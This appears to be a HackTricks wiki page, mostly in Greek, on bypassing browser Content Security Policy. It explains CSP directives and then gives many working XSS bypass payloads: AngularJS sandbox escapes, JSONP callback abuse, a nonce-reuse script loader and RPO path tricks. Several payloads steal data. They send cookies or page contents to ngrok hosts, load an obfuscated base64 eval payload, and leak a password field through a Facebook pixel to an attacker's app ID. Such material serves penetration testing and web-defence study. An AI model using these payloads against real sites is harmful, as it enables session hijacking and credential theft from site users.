# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## What is CSP

Content Security Policy (CSP) αναγνωρίζεται ως τεχνολογία του browser, κυρίως με στόχο την **προστασία από επιθέσεις όπως το cross-site scripting (XSS)**. Λειτουργεί ορίζοντας και καθορίζοντας τις διαδρομές και τις πηγές από τις οποίες ο browser μπορεί να φορτώνει με ασφάλεια πόρους. Αυτοί οι πόροι περιλαμβάνουν στοιχεία όπως εικόνες, frames και JavaScript. Για παράδειγμα, μια πολιτική μπορεί να επιτρέψει τη φόρτωση και την εκτέλεση πόρων από τον ίδιο τομέα (self), συμπεριλαμβανομένων inline resources και την εκτέλεση string code μέσω συναρτήσεων όπως `eval`, `setTimeout`, ή `setInterval`.

Η εφαρμογή του CSP γίνεται μέσω **response headers** ή με την ενσωμάτωση **meta elements στην HTML σελίδα**. Σύμφωνα με αυτή την πολιτική, οι browsers επιβάλλουν ενεργά αυτούς τους κανόνες και μπλοκάρουν άμεσα τυχόν ανιχνευόμενες παραβιάσεις.

- Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Υλοποιείται μέσω meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

Το CSP μπορεί να εφαρμοστεί ή να παρακολουθηθεί χρησιμοποιώντας αυτές τις κεφαλίδες:

- `Content-Security-Policy`: Επιβάλλει το CSP· ο browser μπλοκάρει τυχόν παραβιάσεις.
- `Content-Security-Policy-Report-Only`: Χρησιμοποιείται για παρακολούθηση· αναφέρει παραβιάσεις χωρίς να τις μπλοκάρει. Ιδανικό για δοκιμές σε προπαραγωγικά περιβάλλοντα.

### Defining Resources

Το CSP περιορίζει τις πηγές από τις οποίες φορτώνεται τόσο ενεργό όσο και παθητικό περιεχόμενο, ελέγχοντας πτυχές όπως η εκτέλεση inline JavaScript και η χρήση του `eval()`. Ένα παράδειγμα πολιτικής είναι:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Οδηγίες

- **script-src**: Επιτρέπει συγκεκριμένες πηγές για JavaScript, συμπεριλαμβανομένων URLs, ενσωματωμένων scripts, και scripts που ενεργοποιούνται από event handlers ή XSLT stylesheets.
- **default-src**: Ορίζει μια προεπιλεγμένη πολιτική για την ανάκτηση πόρων όταν λείπουν συγκεκριμένες fetch οδηγίες.
- **child-src**: Καθορίζει επιτρεπόμενες πηγές για web workers και περιεχόμενο ενσωματωμένων frames.
- **connect-src**: Περιορίζει τα URLs που μπορούν να φορτωθούν χρησιμοποιώντας interfaces όπως fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Περιορίζει τα URLs για frames.
- **frame-ancestors**: Καθορίζει ποιες πηγές μπορούν να ενσωματώσουν την τρέχουσα σελίδα, εφαρμόζεται σε στοιχεία όπως `<frame>`, `<iframe>`, `<object>`, `<embed>`, και `<applet>`.
- **img-src**: Ορίζει επιτρεπόμενες πηγές για εικόνες.
- **font-src**: Καθορίζει έγκυρες πηγές για fonts που φορτώνονται χρησιμοποιώντας `@font-face`.
- **manifest-src**: Ορίζει επιτρεπόμενες πηγές για αρχεία manifest εφαρμογής.
- **media-src**: Ορίζει επιτρεπόμενες πηγές για φόρτωση media αντικειμένων.
- **object-src**: Ορίζει επιτρεπόμενες πηγές για `<object>`, `<embed>`, και `<applet>` στοιχεία.
- **base-uri**: Καθορίζει επιτρεπόμενα URLs για φόρτωση χρησιμοποιώντας `<base>` στοιχεία.
- **form-action**: Καταγράφει έγκυρους προορισμούς για υποβολές φορμών.
- **plugin-types**: Περιορίζει τους mime τύπους που μια σελίδα μπορεί να επικαλεστεί.
- **upgrade-insecure-requests**: Δίνει οδηγία στα προγράμματα περιήγησης να επαναγράψουν HTTP URLs σε HTTPS.
- **sandbox**: Εφαρμόζει περιορισμούς παρόμοιους με το attribute sandbox ενός `<iframe>`.
- **report-to**: Καθορίζει μια ομάδα στην οποία θα σταλεί μια αναφορά αν παραβιαστεί η πολιτική.
- **worker-src**: Καθορίζει έγκυρες πηγές για Worker, SharedWorker, ή ServiceWorker scripts.
- **prefetch-src**: Καθορίζει έγκυρες πηγές για πόρους που θα ανακτηθούν ή θα prefetch-αριστούν.
- **navigate-to**: Περιορίζει τα URLs προς τα οποία ένα έγγραφο μπορεί να πλοηγηθεί με οποιοδήποτε μέσο (a, form, window.location, window.open, κ.λπ.)

### Πηγές

- `*`: Επιτρέπει όλα τα URLs εκτός από αυτά με σχήματα `data:`, `blob:`, `filesystem:`.
- `'self'`: Επιτρέπει φόρτωση από το ίδιο domain.
- `'data'`: Επιτρέπει πόρους να φορτωθούν μέσω του data scheme (π.χ., Base64 κωδικοποιημένες εικόνες).
- `'none'`: Αποκλείει φόρτωση από οποιαδήποτε πηγή.
- `'unsafe-eval'`: Επιτρέπει τη χρήση του `eval()` και παρόμοιων μεθόδων, δεν συνιστάται για λόγους ασφαλείας.
- `'unsafe-hashes'`: Ενεργοποιεί συγκεκριμένους inline event handlers.
- `'unsafe-inline'`: Επιτρέπει τη χρήση ενσωματωμένων πόρων όπως inline `<script>` ή `<style>`, δεν συνιστάται για λόγους ασφαλείας.
- `'nonce'`: Μια whitelist για συγκεκριμένα inline scripts που χρησιμοποιούν ένα κρυπτογραφικό nonce (αριθμός που χρησιμοποιείται μία φορά).
- Αν έχετε περιορισμένη εκτέλεση JS, είναι πιθανό να πάρετε ένα χρησιμοποιημένο nonce μέσα στη σελίδα με `doc.defaultView.top.document.querySelector("[nonce]")` και στη συνέχεια να το επαναχρησιμοποιήσετε για να φορτώσετε ένα κακόβουλο script (αν χρησιμοποιείται strict-dynamic, οποιαδήποτε επιτρεπόμενη πηγή μπορεί να φορτώσει νέες πηγές οπότε αυτό δεν είναι απαραίτητο), όπως στο:

<details>

<summary>Φόρτωση script επαναχρησιμοποιώντας nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Εισάγει στη λευκή λίστα scripts με συγκεκριμένο sha256 hash.
- `'strict-dynamic'`: Επιτρέπει τη φόρτωση scripts από οποιαδήποτε πηγή εάν έχουν προστεθεί στη λευκή λίστα μέσω nonce ή hash.
- `'host'`: Καθορίζει έναν συγκεκριμένο host, όπως `example.com`.
- `https:`: Περιορίζει τις διευθύνσεις URL σε αυτές που χρησιμοποιούν HTTPS.
- `blob:`: Επιτρέπει τη φόρτωση πόρων από Blob URLs (π.χ., Blob URLs που δημιουργούνται μέσω JavaScript).
- `filesystem:`: Επιτρέπει τη φόρτωση πόρων από το filesystem.
- `'report-sample'`: Περιλαμβάνει δείγμα του παραβατικού κώδικα στην αναφορά παραβίασης (χρήσιμο για αποσφαλμάτωση).
- `'strict-origin'`: Παρόμοιο με το 'self' αλλά διασφαλίζει ότι το επίπεδο ασφάλειας του πρωτοκόλλου των πηγών ταιριάζει με αυτό του εγγράφου (μόνο ασφαλείς προελεύσεις μπορούν να φορτώσουν πόρους από ασφαλείς προελεύσεις).
- `'strict-origin-when-cross-origin'`: Στέλνει πλήρεις URLs όταν γίνονται αιτήσεις ίδιας προέλευσης αλλά αποστέλλει μόνο την προέλευση όταν η αίτηση είναι cross-origin.
- `'unsafe-allow-redirects'`: Επιτρέπει τη φόρτωση πόρων που θα ανακατευθύνουν άμεσα σε άλλον πόρο. Δεν συνιστάται καθώς αποδυναμώνει την ασφάλεια.

## Μη ασφαλείς κανόνες CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Ενεργό payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' μέσω Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Αυτό δεν λειτουργεί, για περισσότερες πληροφορίες [**δείτε εδώ**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Λειτουργικό payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Αν με κάποιον τρόπο καταφέρετε να κάνετε ένα **allowed JS code created a new script tag** στο DOM με τον JS κώδικά σας — επειδή ένα επιτρεπόμενο script το δημιουργεί — τότε το **new script tag will be allowed to be executed**.

### Wildcard (*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Λειτουργικό payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Έλλειψη object-src και default-src

> [!CAUTION] > **Φαίνεται ότι αυτό δεν λειτουργεί πια**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Λειτουργικά payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### File Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Αν μπορείτε να ανεβάσετε ένα αρχείο JS, μπορείτε να παρακάμψετε αυτό το CSP:

Λειτουργικό payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Ωστόσο, είναι πολύ πιθανό ότι ο server **επαληθεύει το αρχείο που ανεβάζετε** και θα σας επιτρέψει μόνο να **ανεβάσετε συγκεκριμένους τύπους αρχείων**.

Επιπλέον, ακόμα κι αν καταφέρετε να ανεβάσετε **κώδικα JS μέσα** σε ένα αρχείο χρησιμοποιώντας μία επέκταση που γίνεται αποδεκτή από τον server (π.χ. _script.png_) αυτό δεν θα είναι αρκετό επειδή κάποιοι servers όπως ο Apache **επιλέγουν το MIME type του αρχείου βάσει της επέκτασης** και browsers όπως ο Chrome θα **αρνηθούν να εκτελέσουν Javascript** κώδικα μέσα σε κάτι που θα έπρεπε να είναι εικόνα. "Ευτυχώς", υπάρχουν λάθη. Για παράδειγμα, από ένα CTF έμαθα ότι **ο Apache δεν γνωρίζει** την _**.wave**_ επέκταση, επομένως δεν την εξυπηρετεί με **MIME type όπως audio/***.

Από εδώ, αν βρείτε XSS και δυνατότητα file upload, και καταφέρετε να βρείτε μια **επέκταση που παρερμηνεύεται**, μπορείτε να δοκιμάσετε να ανεβάσετε ένα αρχείο με αυτήν την επέκταση και με το περιεχόμενο του script. Ή, αν ο server ελέγχει το σωστό format του ανεβασμένου αρχείου, δημιουργήστε ένα polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Αν δεν είναι εφικτό να εγχύσετε JS, μπορείτε ακόμα να δοκιμάσετε να εξάγετε, για παράδειγμα, credentials εγχύοντας ένα form action (και ίσως περιμένοντας από password managers να συμπληρώσουν αυτόματα τα passwords). Μπορείτε να βρείτε ένα [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Επίσης, σημειώστε ότι `default-src` δεν καλύπτει τα form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Για κάποια από τα παρακάτω payload **`unsafe-eval` δεν είναι καν απαραίτητο**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Φορτώστε μια ευάλωτη έκδοση του angular και εκτελέστε αυθαίρετο JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads που χρησιμοποιούν Angular + μια βιβλιοθήκη με συναρτήσεις που επιστρέφουν το `window` αντικείμενο ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> Το άρθρο δείχνει ότι μπορείτε να **φορτώσετε** όλες τις **βιβλιοθήκες** από `cdn.cloudflare.com` (ή οποιοδήποτε άλλο επιτρεπόμενο αποθετήριο βιβλιοθηκών JS), να εκτελέσετε όλες τις προστιθέμενες συναρτήσεις από κάθε βιβλιοθήκη, και να ελέγξετε **ποιες συναρτήσεις από ποιες βιβλιοθήκες επιστρέφουν το `window` αντικείμενο**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS από ένα όνομα κλάσης:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Κατάχρηση google recaptcha JS κώδικα

Σύμφωνα με [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) μπορείτε να καταχραστείτε [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) μέσα σε ένα CSP για να εκτελέσετε αυθαίρετο JS κώδικα παρακάμπτοντας το CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Περισσότερα [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Κατάχρηση του www.google.com για open redirect

Η παρακάτω URL ανακατευθύνει στο example.com (από [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusing \*.google.com/script.google.com

Είναι δυνατόν να καταχραστεί κανείς το Google Apps Script για να λάβει πληροφορίες σε μία σελίδα εντός του script.google.com. Όπως συμβαίνει σε αυτή την αναφορά [done in this report](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Third Party Endpoints + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Σενάρια όπως αυτό όπου το `script-src` είναι ρυθμισμένο σε `self` και ένα συγκεκριμένο domain που είναι στη whitelist μπορούν να παρακαμφθούν χρησιμοποιώντας JSONP. Τα JSONP endpoints επιτρέπουν μη ασφαλείς μεθόδους callback που επιτρέπουν σε έναν επιτιθέμενο να εκτελέσει XSS, working payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **περιέχει έτοιμα προς χρήση JSONP endpoints για CSP bypass σε διάφορους ιστότοπους.**

Η ίδια ευπάθεια θα παρουσιαστεί αν το **trusted endpoint περιέχει ένα Open Redirect**, διότι αν το αρχικό endpoint είναι trusted, τότε και τα redirects θεωρούνται trusted.

### Καταχρήσεις τρίτων

Όπως περιγράφεται στο [ακόλουθο post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), υπάρχουν πολλά third party domains που μπορεί να επιτρέπονται κάπου στο CSP και μπορούν να καταχραστούν είτε για εξαγωγή δεδομένων είτε για εκτέλεση JavaScript κώδικα. Μερικοί από αυτούς τους τρίτους είναι:

| Οντότητα          | Επιτρεπόμενο Domain                           | Δυνατότητες |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Αν βρείτε κάποιο από τα επιτρεπόμενα domains στο CSP του στόχου σας, υπάρχει πιθανότητα να μπορέσετε να παρακάμψετε το CSP εγγραφόμενοι στην υπηρεσία τρίτου μέρους και είτε να εξάγετε δεδομένα σε αυτήν την υπηρεσία είτε να εκτελέσετε κώδικα.

Για παράδειγμα, αν βρείτε το ακόλουθο CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ή
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Πρέπει να μπορείτε να exfiltrate data, παρόμοια με το πώς γινόταν πάντα με [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Σε αυτή την περίπτωση, ακολουθείτε τα παρακάτω γενικά βήματα:

1. Δημιουργήστε έναν Facebook Developer account εδώ.
2. Δημιουργήστε μια νέα εφαρμογή "Facebook Login" και επιλέξτε "Website".
3. Πηγαίνετε στο "Settings -> Basic" και πάρτε το "App ID" σας.
4. Στο target site από το οποίο θέλετε να exfiltrate data, μπορείτε να exfiltrate data χρησιμοποιώντας απευθείας το Facebook SDK gadget "fbq" μέσω ενός "customEvent" και του data payload.
5. Πηγαίνετε στην App σας "Event Manager" και επιλέξτε την εφαρμογή που δημιουργήσατε (σημειώστε ότι ο event manager μπορεί να βρεθεί σε ένα URL παρόμοιο με αυτό: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Επιλέξτε την καρτέλα "Test Events" για να δείτε τα events που αποστέλλονται από το "your" web site.

Έπειτα, στην victim πλευρά, εκτελείτε τον ακόλουθο κώδικα για να αρχικοποιήσετε το Facebook tracking pixel ώστε να δείχνει στο attacker's Facebook developer account app-id και να εκδώσετε ένα custom event όπως το εξής:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Όσον αφορά τους άλλους επτά third-party domains που αναφέρονται στον προηγούμενο πίνακα, υπάρχουν πολλοί άλλοι τρόποι να τους καταχραστείτε. Ανατρέξτε στο προηγούμενο [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) για πρόσθετες εξηγήσεις σχετικά με άλλες καταχρήσεις από τρίτους.

### Παράκαμψη μέσω RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Εκτός από την προαναφερθείσα ανακατεύθυνση για παράκαμψη των περιορισμών μονοπατιού, υπάρχει άλλη τεχνική που ονομάζεται Relative Path Overwrite (RPO) και μπορεί να χρησιμοποιηθεί σε ορισμένους servers.

Για παράδειγμα, αν το CSP επιτρέπει τη διαδρομή `https://example.com/scripts/react/`, μπορεί να παρακαμφθεί ως εξής:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Ο browser τελικά θα φορτώσει `https://example.com/scripts/angular/angular.js`.

Αυτό λειτουργεί επειδή για τον browser φορτώνετε ένα αρχείο με όνομα `..%2fangular%2fangular.js` που βρίσκεται κάτω από `https://example.com/scripts/react/`, το οποίο συμμορφώνεται με το CSP.

Στη συνέχεια ο browser θα το αποκωδικοποιήσει, ζητώντας ουσιαστικά `https://example.com/scripts/react/../angular/angular.js`, το οποίο ισοδυναμεί με `https://example.com/scripts/angular/angular.js`.

**Εκμεταλλευόμενοι αυτή την ασυνέπεια στην ερμηνεία του URL μεταξύ του browser και του server, οι κανόνες διαδρομής μπορούν να παρακαμφθούν.**

Η λύση είναι να μην αντιμετωπίζεται το `%2f` ως `/` από την πλευρά του διακομιστή, διασφαλίζοντας συνεπή ερμηνεία μεταξύ του browser και του διακομιστή για να αποφευχθεί αυτό το πρόβλημα.

Παράδειγμα Online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Ελλείπει **base-uri**

Αν η οδηγία **base-uri** λείπει, μπορείτε να την καταχραστείτε για να πραγματοποιήσετε ένα [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Επιπλέον, εάν η **σελίδα φορτώνει ένα script χρησιμοποιώντας σχετική διαδρομή** (όπως `<script src="/js/app.js">`) και χρησιμοποιεί **Nonce**, μπορείτε να καταχραστείτε την **base** **tag** ώστε να **φορτωθεί** το script από **τον δικό σας server, επιτυγχάνοντας XSS.**\
Αν η ευάλωτη σελίδα φορτώνεται με **httpS**, χρησιμοποιήστε μια httpS url στην base.
```html
<base href="https://www.attacker.com/" />
```
### AngularJS γεγονότα

Μια συγκεκριμένη πολιτική, γνωστή ως Content Security Policy (CSP), μπορεί να περιορίσει τα JavaScript events. Ωστόσο, το AngularJS εισάγει custom events ως εναλλακτική. Μέσα σε ένα event, το AngularJS παρέχει ένα ξεχωριστό αντικείμενο `$event`, που αναφέρεται στο εγγενές αντικείμενο event του browser. Αυτό το αντικείμενο `$event` μπορεί να αξιοποιηθεί για να παρακάμψει την CSP. Σημειωτέον, στο Chrome, το αντικείμενο `$event/event` διαθέτει την ιδιότητα `path`, που περιέχει έναν πίνακα αντικειμένων εμπλεκόμενων στην αλυσίδα εκτέλεσης του event, με το αντικείμενο `window` να βρίσκεται πάντα στο τέλος. Αυτή η δομή είναι κρίσιμη για τεχνικές απόδρασης από sandbox.

Διευθύνοντας αυτόν τον πίνακα στο φίλτρο `orderBy`, είναι δυνατόν να τον επαναλάβουμε και να χρησιμοποιήσουμε το τελικό στοιχείο (το αντικείμενο `window`) για να καλέσουμε μια global συνάρτηση όπως `alert()`. Το παρακάτω παράδειγμα κώδικα αποσαφηνίζει αυτή τη διαδικασία:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Αυτό το απόσπασμα αναδεικνύει τη χρήση του `ng-focus` directive για να ενεργοποιήσει το event, χρησιμοποιώντας `$event.path|orderBy` για την τροποποίηση του πίνακα `path` και αξιοποιώντας το αντικείμενο `window` για να εκτελέσει τη συνάρτηση `alert()`, αποκαλύπτοντας έτσι το `document.cookie`.

**Βρείτε άλλες Angular bypasses στο** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS and whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Μια πολιτική CSP που προσθέτει domains στη whitelist για script loading σε μια εφαρμογή Angular JS μπορεί να παρακαμφθεί μέσω της κλήσης callback functions και ορισμένων vulnerable classes. Περαιτέρω πληροφορίες για αυτή την τεχνική υπάρχουν σε έναν αναλυτικό οδηγό διαθέσιμο σε αυτό το [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Άλλα JSONP arbitrary execution endpoints μπορούν να βρεθούν στο [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (μερικά από αυτά διαγράφηκαν ή διορθώθηκαν)

### Bypass via Redirection

Τι συμβαίνει όταν το CSP συναντά server-side redirection; Αν η ανακατεύθυνση οδηγεί σε διαφορετικό origin που δεν επιτρέπεται, θα αποτύχει.

Ωστόσο, σύμφωνα με την περιγραφή στο [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), αν η ανακατεύθυνση οδηγεί σε διαφορετική διαδρομή, μπορεί να παρακάμψει τους αρχικούς περιορισμούς.

Εδώ ένα παράδειγμα:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
If CSP is set to `https://www.google.com/a/b/c/d`, since the path is considered, both `/test` and `/a/test` scripts will be blocked by CSP.

Ωστόσο, το τελικό `http://localhost:5555/301` θα **ανακατευθυνθεί στην πλευρά του server σε `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Εφόσον πρόκειται για ανακατεύθυνση, η **διαδρομή δεν λαμβάνεται υπόψη**, και το **script μπορεί να φορτωθεί**, παρακάμπτοντας έτσι τον περιορισμό της διαδρομής.

Με αυτή την ανακατεύθυνση, ακόμη και αν η διαδρομή καθοριστεί πλήρως, θα παρακαμφθεί.

Επομένως, η καλύτερη λύση είναι να διασφαλιστεί ότι ο ιστότοπος δεν έχει ευπάθειες open redirect και ότι δεν υπάρχουν domains που μπορούν να εκμεταλλευτούν στους κανόνες CSP.

### Παράκαμψη CSP με dangling markup

Read [how here](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` σημαίνει ότι μπορείτε να εκτελέσετε οποιοδήποτε script μέσα στον κώδικα (το XSS μπορεί να εκτελέσει κώδικα) και `img-src *` σημαίνει ότι μπορείτε να χρησιμοποιήσετε στη σελίδα οποιαδήποτε εικόνα από οποιαδήποτε πηγή.

